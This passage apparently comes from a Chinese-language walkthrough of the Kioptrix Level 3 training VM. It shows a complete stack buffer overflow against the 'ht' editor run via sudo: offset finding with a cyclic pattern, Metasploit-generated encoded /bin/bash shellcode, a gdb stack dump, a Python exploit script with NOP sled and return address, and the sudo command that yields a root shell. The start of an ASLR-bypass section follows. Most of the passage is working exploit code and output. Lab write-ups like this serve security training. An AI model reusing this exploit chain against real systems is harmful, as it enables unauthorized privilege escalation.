1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2Df3Df4Df5Df6Df7Df8Df9Dg0Dg1Dg2Dg3Dg4Dg5Dg6Dg7Dg8Dg9Dh0Dh1Dh2Dh3Dh4Dh5Dh6Dh7Dh8Dh9Di0Di1Di2Di3Di4Di5Di6Di7Di8Di9Dj0Dj1Dj2Dj3Dj4Dj5Dj6Dj7Dj8Dj9Dk0Dk1Dk2Dk3Dk4Dk5Dk6Dk7Dk8Dk9Dl0Dl1Dl2Dl3Dl4Dl5Dl6Dl7Dl8Dl9Dm0Dm1Dm2Dm3Dm4Dm5Dm6Dm7Dm8Dm9Dn0Dn1Dn2Dn3Dn4Dn5Dn6Dn7Dn8Dn9Do0Do1Do2Do3Do4Do5Do6Do7Do8Do9Dp0Dp1Dp2Dp3Dp4Dp5Dp6Dp7Dp8Dp9Dq0Dq1Dq2Dq3Dq4Dq5Dq6Dq7Dq8Dq9Dr0Dr1Dr2Dr3Dr4Dr5Dr6Dr7Dr8Dr9Ds0Ds1Ds2Ds3Ds4Ds5Ds6Ds7Ds8Ds9Dt0Dt1Dt2Dt3Dt4Dt5Dt6Dt7Dt8Dt9Du0Du1Du2Du3Du4Du5Du6Du7Du8Du9Dv0Dv1Dv2Dv3Dv4Dv5Dv6Dv7Dv8Dv9Dw0Dw1Dw2Dw3Dw4Dw5Dw6Dw7Dw8Dw9Dx0Dx1Dx2Dx3Dx4Dx5Dx6Dx7Dx8Dx9Dy0Dy1Dy2Dy3Dy4Dy5Dy6Dy7Dy8Dy9Dz0Dz1Dz2Dz3Dz4Dz5Dz6Dz7Dz8Dz9Ea0Ea1Ea2Ea3Ea4Ea5Ea6Ea7Ea8Ea9Eb0Eb1Eb2Eb3Eb4Eb5Eb6Eb7Eb8Eb9Ec0Ec1Ec2Ec3Ec4Ec5Ec6Ec7Ec8Ec9Ed0Ed1Ed2Ed3Ed4Ed5Ed6Ed7Ed8Ed9Ee0Ee1Ee2Ee3Ee4Ee5Ee6Ee7Ee8Ee9Ef0Ef1Ef2Ef3Ef4Ef5Ef6Ef7Ef8Ef9Eg0Eg1Eg2Eg3Eg4Eg5Eg6Eg7Eg8Eg9Eh0Eh1Eh2Eh3Eh4Eh5Eh6Eh7Eh8Eh9Ei0Ei1Ei2Ei3Ei4Ei5Ei6Ei7Ei8Ei9Ej0Ej1Ej2Ej3Ej4Ej5Ej6Ej7Ej8Ej9Ek0Ek1Ek2Ek3Ek4Ek5Ek6Ek7Ek8Ek9El0El1El2El3El4El5El6El7El8El9Em0Em1Em2Em3Em4Em5Em6Em7Em8Em9En0En1En2En3En4En5En6En7En8En9Eo0Eo1Eo2Eo3Eo4Eo5Eo6Eo7Eo8Eo9Ep0Ep1Ep2Ep3Ep4Ep5Ep6Ep7Ep8Ep9Eq0Eq1Eq2Eq3Eq4Eq5Eq6Eq7Eq8Eq9Er0Er1Er2Er3Er4Er5Er6Er7Er8Er9Es0Es1Es2Es3Es4Es5Es6Es7Es8Es9Et0Et1Et2Et3Et4Et5Et6Et7Et8Et9Eu0Eu1Eu2Eu3Eu4Eu5Eu6Eu7Eu8Eu9Ev0Ev1Ev2Ev3Ev4Ev5Ev6Ev7Ev8Ev9Ew0Ew1Ew2Ew3Ew4Ew5Ew6Ew7Ew8Ew9Ex0Ex1Ex2Ex3Ex4Ex5Ex6Ex7Ex8Ex9Ey0Ey1Ey2Ey3Ey4Ey5Ey6Ey7Ey8Ey9Ez0Ez1Ez2Ez3Ez4Ez5Ez6Ez7Ez8Ez9Fa0Fa1Fa2Fa3Fa4Fa5Fa6Fa7Fa8Fa9Fb0Fb1Fb2Fb3Fb4Fb5Fb6Fb7Fb8Fb9Fc0Fc1Fc2Fc3Fc4Fc5Fc6Fc7Fc8Fc9Fd0Fd1Fd2Fd3Fd4Fd5Fd6Fd7Fd8Fd9Fe0Fe1Fe2Fe3Fe4Fe5Fe6Fe7Fe8Fe9Ff0Ff1Ff2Ff3Ff4Ff5Ff6Ff7Ff8Ff9Fg0Fg1Fg2Fg3Fg4Fg5Fg6Fg7Fg8Fg9Fh0Fh1Fh2Fh3Fh4Fh5Fh6Fh7Fh8Fh9Fi0Fi1Fi2Fi3Fi4Fi5Fi6Fi7Fi8Fi9Fj0Fj1Fj2Fj3Fj4Fj5Fj6Fj7Fj8Fj9Fk0Fk1Fk2Fk3Fk4Fk5Fk6Fk7Fk8Fk9Fl0Fl1Fl2Fl3Fl4Fl5Fl6Fl7Fl8Fl9Fm0Fm1Fm2Fm3Fm4Fm5Fm6Fm7Fm8Fm9Fn0Fn1Fn2Fn3Fn4Fn5Fn6Fn7Fn8Fn9Fo0Fo1Fo2Fo3Fo4Fo5Fo6Fo7Fo8Fo9Fp0Fp1Fp2Fp3Fp4Fp5Fp6Fp7Fp8Fp9Fq0Fq1Fq2Fq3Fq4Fq5Fq&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> buff</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202410032240687.jpg" /></p>
<p>得 EIP 之前的偏移量 4091</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/usr/share/metasploit-framework/tools/exploit]</span><br><span class="line">└─<span class="comment"># ./pattern_offset.rb -q 0x34674633 -l 4400</span></span><br><span class="line">[*] Exact match at offset 4091</span><br></pre></td></tr></table></figure>
<p>测试对 EIP 的覆盖</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(gdb) run `python -c <span class="string">&#x27;print &quot;\x90&quot;*4091+&quot;\x42\x42\x42\x42&quot;&#x27;</span>`</span><br></pre></td></tr></table></figure>
<p>EIP 可成功被覆盖（<code>\x42</code>）</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202410032248549.jpg" /></p>
<p>MSF 生成 shellcode</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; use payload/linux/x86/exec </span><br><span class="line">msf6 payload(linux/x86/exec) &gt; show options </span><br><span class="line"></span><br><span class="line">Module options (payload/linux/x86/exec):</span><br><span class="line"></span><br><span class="line">   Name  Current Setting  Required  Description</span><br><span class="line">   ----  ---------------  --------  -----------</span><br><span class="line">   CMD                    no        The <span class="built_in">command</span> string to execute</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">View the full module info with the info, or info -d <span class="built_in">command</span>.</span><br><span class="line"></span><br><span class="line">msf6 payload(linux/x86/exec) &gt; <span class="built_in">set</span> cmd /bin/bash</span><br><span class="line">cmd =&gt; /bin/bash</span><br><span class="line">msf6 payload(linux/x86/exec) &gt; <span class="built_in">set</span> encoder x86/alpha_mixed </span><br><span class="line">encoder =&gt; x86/alpha_mixed</span><br><span class="line">msf6 payload(linux/x86/exec) &gt; generate </span><br><span class="line"><span class="comment"># linux/x86/exec - 152 bytes</span></span><br><span class="line"><span class="comment"># https://metasploit.com/</span></span><br><span class="line"><span class="comment"># Encoder: x86/alpha_mixed</span></span><br><span class="line"><span class="comment"># VERBOSE=false, PrependFork=false, PrependSetresuid=false, </span></span><br><span class="line"><span class="comment"># PrependSetreuid=false, PrependSetuid=false, </span></span><br><span class="line"><span class="comment"># PrependSetresgid=false, PrependSetregid=false, </span></span><br><span class="line"><span class="comment"># PrependSetgid=false, PrependChrootBreak=false, </span></span><br><span class="line"><span class="comment"># AppendExit=false, CMD=/bin/bash, NullFreeVersion=false</span></span><br><span class="line">buf = </span><br><span class="line"><span class="string">&quot;\x89\xe0\xdb\xd3\xd9\x70\xf4\x5f\x57\x59\x49\x49\x49\x49&quot;</span> +</span><br><span class="line"><span class="string">&quot;\x49\x49\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43\x37\x51&quot;</span> +</span><br><span class="line"><span class="string">&quot;\x5a\x6a\x41\x58\x50\x30\x41\x30\x41\x6b\x41\x41\x51\x32&quot;</span> +</span><br><span class="line"><span class="string">&quot;\x41\x42\x32\x42\x42\x30\x42\x42\x41\x42\x58\x50\x38\x41&quot;</span> +</span><br><span class="line"><span class="string">&quot;\x42\x75\x4a\x49\x33\x5a\x46\x6b\x73\x68\x6d\x49\x53\x62&quot;</span> +</span><br><span class="line"><span class="string">&quot;\x53\x56\x52\x48\x34\x6d\x45\x33\x4f\x79\x69\x77\x71\x78&quot;</span> +</span><br><span class="line"><span class="string">&quot;\x44\x6f\x72\x53\x42\x48\x63\x30\x55\x38\x54\x6f\x73\x52&quot;</span> +</span><br><span class="line"><span class="string">&quot;\x72\x49\x42\x4e\x4d\x59\x48\x63\x62\x72\x4d\x38\x66\x6a&quot;</span> +</span><br><span class="line"><span class="string">&quot;\x57\x70\x33\x30\x63\x30\x46\x4f\x50\x62\x33\x59\x42\x4e&quot;</span> +</span><br><span class="line"><span class="string">&quot;\x46\x4f\x32\x42\x43\x51\x64\x33\x73\x58\x73\x30\x63\x67&quot;</span> +</span><br><span class="line"><span class="string">&quot;\x72\x73\x6f\x79\x6d\x31\x4a\x6d\x4f\x70\x41\x41&quot;</span></span><br><span class="line">msf6 payload(linux/x86/exec) &gt; </span><br></pre></td></tr></table></figure>
<p>shellcode 占 152 字节</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">loneferret@Kioptrix3:~$ python -c <span class="string">&#x27;print len(&quot;\x89\xe0\xdb\xd3\xd9\x70\xf4\x5f\x57\x59\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43\x37\x51\x5a\x6a\x41\x58\x50\x30\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49\x33\x5a\x46\x6b\x73\x68\x6d\x49\x53\x62\x53\x56\x52\x48\x34\x6d\x45\x33\x4f\x79\x69\x77\x71\x78\x44\x6f\x72\x53\x42\x48\x63\x30\x55\x38\x54\x6f\x73\x52\x72\x49\x42\x4e\x4d\x59\x48\x63\x62\x72\x4d\x38\x66\x6a\x57\x70\x33\x30\x63\x30\x46\x4f\x50\x62\x33\x59\x42\x4e\x46\x4f\x32\x42\x43\x51\x64\x33\x73\x58\x73\x30\x63\x67\x72\x73\x6f\x79\x6d\x31\x4a\x6d\x4f\x70\x41\x41&quot;)&#x27;</span></span><br><span class="line">152</span><br></pre></td></tr></table></figure>
<p>为此缓冲区可填充的 nops 为 4091-152=3939 字节</p>
<p>确定 shellcode 开始地址【即需写入 EIP 的地址】，修改
BufferOverflow.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"></span><br><span class="line">nops=<span class="string">&quot;\x90&quot;</span>*<span class="number">3939</span></span><br><span class="line"></span><br><span class="line">shellcode=<span class="string">&quot;\x89\xe0\xdb\xd3\xd9\x70\xf4\x5f\x57\x59\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43\x37\x51\x5a\x6a\x41\x58\x50\x30\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49\x33\x5a\x46\x6b\x73\x68\x6d\x49\x53\x62\x53\x56\x52\x48\x34\x6d\x45\x33\x4f\x79\x69\x77\x71\x78\x44\x6f\x72\x53\x42\x48\x63\x30\x55\x38\x54\x6f\x73\x52\x72\x49\x42\x4e\x4d\x59\x48\x63\x62\x72\x4d\x38\x66\x6a\x57\x70\x33\x30\x63\x30\x46\x4f\x50\x62\x33\x59\x42\x4e\x46\x4f\x32\x42\x43\x51\x64\x33\x73\x58\x73\x30\x63\x67\x72\x73\x6f\x79\x6d\x31\x4a\x6d\x4f\x70\x41\x41&quot;</span></span><br><span class="line"></span><br><span class="line">eip=<span class="string">&quot;\x42\x42\x42\x42&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> nops + shellcode + eip</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><code>x/300wx $esp</code> : 从 <code>$esp</code>
指向的内存地址开始，查看接下来的 300 个 word（每个 word 4
字节）内容。</p>
<ul>
<li><strong>x/</strong>：这是
<code>x</code>（examine）命令，用于查看内存内容。</li>
<li><strong>300</strong>：这是一个参数，指定要查看的字节数。在这个上下文中，表示要显示
300 个单元的内容。</li>
<li><strong>w</strong>：表示“word”。在 x86 架构中，word 通常是 4
字节。因此，<code>w</code> 表示每个单元为 4 字节。</li>
<li><strong>x</strong>：第二个 <code>x</code>
表示以十六进制格式显示内存内容。</li>
<li><strong>$esp</strong>：这是一个寄存器，表示当前栈指针（Extended
Stack Pointer），指向栈的顶部。</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">(gdb) x/300wx <span class="variable">$esp</span>            </span><br><span class="line">0xbfffe7a0:     0x08281100      0x00000001      0x00000691      0x00000000  </span><br><span class="line">0xbfffe7b0:     0x00000004      0x01000018      0xbfffe8d4      0x00000002  </span><br><span class="line">0xbfffe7c0:     0x30305043      0x00000001      0x00000006      0x00000000 </span><br><span class="line">0xbfffe7d0:     0xbfffe8d4      0x00000002      0x00000000      0x080b753e   </span><br><span class="line">0xbfffe7e0:     0xbfffe824      0xbfffe820      0x081fafc8      0x00000000     </span><br><span class="line">0xbfffe7f0:     0xfffffff4      0xb7ffece0      0xbfffe818      0x0804ad30 </span><br><span class="line">0xbfffe800:     0x0804ad50      0x00000000      0x081bd684      0x0814d435    </span><br><span class="line">0xbfffe810:     0xb7e48c19      0x081bd3f8      0xbfffe828      0x0804a294     </span><br><span class="line">0xbfffe820:     0x00000000      0x00000000      0xbfffe850      0xb7e84ff4    </span><br><span class="line">0xbfffe830:     0xb7ffece0      0x00000000      0xbfffe8a8      0xb7d50450    </span><br><span class="line">0xbfffe840:     0xb7ffece0      0x0814d340      0xbfffe8a8      0xb7d50450      </span><br><span class="line">0xbfffe850:     0x00000002      0xbfffe8d4      0xbfffe8e0      0xb7eb9938      </span><br><span class="line">0xbfffe860:     0x00000000      0x00000001      0x00000000      0x08049a11      </span><br><span class="line">0xbfffe870:     0xb7e84ff4      0xb7ffece0      0x00000000      0xbfffe8a8     </span><br><span class="line">0xbfffe880:     0x1770a086      0x42a82a96      0x00000000      0x00000000 </span><br><span class="line">0xbfffe890:     0x00000000      0xb7ff6b80      0xb7d5037d      0xb7ffeff4    </span><br><span class="line">0xbfffe8a0:     0x00000002      0x0804ac40      0x00000000      0x0804ac61     </span><br><span class="line">0xbfffe8b0:     0x080b73e0      0x00000002      0xbfffe8d4      0x0814d340    </span><br><span class="line">0xbfffe8c0:     0x0814d330      0xb7ff1e20      0xbfffe8cc      0xb7ffc3e5  </span><br><span class="line">0xbfffe8d0:     0x00000002      0xbfffe9de      0xbfffe9f0      0x00000000   </span><br><span class="line">0xbfffe8e0:     0xbffff9f0      0xbffffa00      0xbffffa0b      0xbffffa2d    </span><br><span class="line">0xbfffe8f0:     0xbffffa40      0xbffffa50      0xbffffe79      0xbffffe85     </span><br><span class="line">0xbfffe900:     0xbffffed2      0xbffffeec      0xbffffefb      0xbfffff10    </span><br><span class="line">0xbfffe910:     0xbfffff21      0xbfffff2a      0xbfffff41      0xbfffff57    </span><br><span class="line">0xbfffe920:     0xbfffff5f      0xbfffff72      0xbfffffa8      0xbfffffc8      </span><br><span class="line">0xbfffe930:     0x00000000      0x00000020      0xb7fe3400      0x00000021        </span><br><span class="line">0xbfffe940:     0xb7fe3000      0x00000010      0x0f8bfbff      0x00000006    </span><br><span class="line">0xbfffe950:     0x00001000      0x00000011      0x00000064      0x00000003     </span><br><span class="line">0xbfffe960:     0x08048034      0x00000004      0x00000020      0x00000005    </span><br><span class="line">0xbfffe970:     0x00000008      0x00000007      0xb7fe4000      0x00000008   </span><br><span class="line">0xbfffe980:     0x00000000      0x00000009      0x0804ac40      0x0000000b    </span><br><span class="line">0xbfffe990:     0x000003e8      0x0000000c      0x000003e8      0x0000000d    </span><br><span class="line">0xbfffe9a0:     0x00000064      0x0000000e      0x00000064      0x00000017   </span><br><span class="line">0xbfffe9b0:     0x00000001      0x0000000f      0xbfffe9cb      0x00000000   </span><br><span class="line">0xbfffe9c0:     0x00000000      0x00000000      0x69000000      0x00363836  </span><br><span class="line">0xbfffe9d0:     0x00000000      0x00000000      0x00000000      0x752f0000   </span><br><span class="line">0xbfffe9e0:     0x6c2f7273      0x6c61636f      0x6e69622f      0x0074682f      </span><br><span class="line">0xbfffe9f0:     0x90909090      0x90909090      0x90909090      0x90909090   </span><br><span class="line">0xbfffea00:     0x90909090      0x90909090      0x90909090      0x90909090        </span><br><span class="line">0xbfffea10:     0x90909090      0x90909090      0x90909090      0x90909090        </span><br><span class="line">0xbfffea20:     0x90909090      0x90909090      0x90909090      0x90909090      </span><br><span class="line">0xbfffea30:     0x90909090      0x90909090      0x90909090      0x90909090    </span><br><span class="line">0xbfffea40:     0x90909090      0x90909090      0x90909090      0x90909090    </span><br><span class="line">0xbfffea50:     0x90909090      0x90909090      0x90909090      0x90909090    </span><br><span class="line">0xbfffea60:     0x90909090      0x90909090      0x90909090      0x90909090    </span><br><span class="line">0xbfffea70:     0x90909090      0x90909090      0x90909090      0x90909090</span><br><span class="line"></span><br><span class="line">………………………………</span><br><span class="line"></span><br><span class="line">0xbffff930:     0x90909090      0x90909090      0x90909090      0x90909090</span><br><span class="line">0xbffff940:     0x90909090      0x90909090      0x90909090      0x90909090</span><br><span class="line">0xbffff950:     0x89909090      0xd9d3dbe0      0x575ff470      0x49494959</span><br><span class="line">0xbffff960:     0x49494949      0x43494949      0x43434343      0x5a513743</span><br><span class="line">0xbffff970:     0x5058416a      0x41304130      0x5141416b      0x32424132</span><br><span class="line">0xbffff980:     0x42304242      0x58424142      0x42413850      0x33494a75</span><br><span class="line">0xbffff990:     0x736b465a      0x53496d68      0x52565362      0x456d3448</span><br><span class="line">0xbffff9a0:     0x69794f33      0x44787177      0x4253726f      0x55306348</span><br><span class="line">0xbffff9b0:     0x736f5438      0x42497252      0x48594d4e      0x4d726263</span><br><span class="line">0xbffff9c0:     0x576a6638      0x63303370      0x504f4630      0x42593362</span><br><span class="line">0xbffff9d0:     0x324f464e      0x64514342      0x73587333      0x72676330</span><br><span class="line">0xbffff9e0:     0x6d796f73      0x4f6d4a31      0x42414170      0x00424242</span><br><span class="line">0xbffff9f0:     0x4c454853      0x622f3d4c      0x622f6e69      0x00687361</span><br><span class="line">0xbffffa00:     0x4d524554      0x6574783d      0x53006d72      0x435f4853</span><br><span class="line">0xbffffa10:     0x4e45494c      0x39313d54      0x36312e32      0x35312e38</span><br><span class="line">0xbffffa20:     0x20312e39      0x35303435      0x32322032      0x48535300</span><br><span class="line">0xbffffa30:     0x5954545f      0x65642f3d      0x74702f76      0x00322f73</span><br><span class="line">0xbffffa40:     0x52455355      0x6e6f6c3d      0x72656665      0x00746572</span><br><span class="line">0xbffffa50:     0x435f534c      0x524f4c4f      0x6f6e3d53      0x3a30303d</span><br></pre></td></tr></table></figure>
<p>可见 shellcode 是从 <code>0xbffff950</code> 开始，修改
BufferOverflow.py 中 EIP 为 <code>\x50\xf9\xff\xbf</code> 【由于 x86
处理器是 little endian 字节序，需反向写地址】</p>
<p>BufferOverflow.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"></span><br><span class="line">nops=<span class="string">&quot;\x90&quot;</span>*<span class="number">3939</span></span><br><span class="line"></span><br><span class="line">shellcode=<span class="string">&quot;\x89\xe0\xdb\xd3\xd9\x70\xf4\x5f\x57\x59\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43\x37\x51\x5a\x6a\x41\x58\x50\x30\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49\x33\x5a\x46\x6b\x73\x68\x6d\x49\x53\x62\x53\x56\x52\x48\x34\x6d\x45\x33\x4f\x79\x69\x77\x71\x78\x44\x6f\x72\x53\x42\x48\x63\x30\x55\x38\x54\x6f\x73\x52\x72\x49\x42\x4e\x4d\x59\x48\x63\x62\x72\x4d\x38\x66\x6a\x57\x70\x33\x30\x63\x30\x46\x4f\x50\x62\x33\x59\x42\x4e\x46\x4f\x32\x42\x43\x51\x64\x33\x73\x58\x73\x30\x63\x67\x72\x73\x6f\x79\x6d\x31\x4a\x6d\x4f\x70\x41\x41&quot;</span></span><br><span class="line"></span><br><span class="line">eip=<span class="string">&quot;\x50\xf9\xff\xbf&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> nops + shellcode + eip</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>提权命令</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo /usr/local/bin/ht `python BufferOverflow.py`</span><br><span class="line">reset</span><br><span class="line">xterm</span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202410032340510.jpg" /></p>
<p>获得 root 权限</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202410032343725.jpg" /></p>
<h4 id="aslr-绕过法">3.5.2. ASLR 绕过法</h4>
<p>另一种绕过 ASLR 保护的方法，详见：<a
target="_blank" rel="noopener" href="https://vimeo.com/28327470">Kioptrix level 3 solution</a></p>
<blockquote>
<p>EIP 确定工具：<a target="_blank" rel="noopener" href="https://github.com/crowell/jmpbuster">GitHub -
crowell/jmpbuster: bypass aslr if you haven't got nx</a></p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">loneferret@Kioptrix3:~$ <span class="built_in">cd</span> jmpbuster/</span><br><span class="line">loneferret@Kioptrix3:~/jmpbuster$</span><br><span class="line">loneferret@Kioptrix3:~/jmpbuster$ <span class="built_in">ls</span> -al</span><br><span class="line">total 32</span><br><span class="line">drwxr-xr-x 2 loneferret <span class="built_in">users</span>      4096 2024-10-03 15:41 .</span><br><span class="line">drwxr-xr-x 4 loneferret loneferret 4096 2024-10-03 15:40 ..</span><br><span class="line">-rw-r--r-- 1 loneferret <span class="built_in">users</span>      7059 2024-10-03 15:41 jmpbustarm.c</span><br><span class="line">-rw-r--r-- 1 loneferret <span class="built_in">users</span>      3357 2024-10-03 15:41 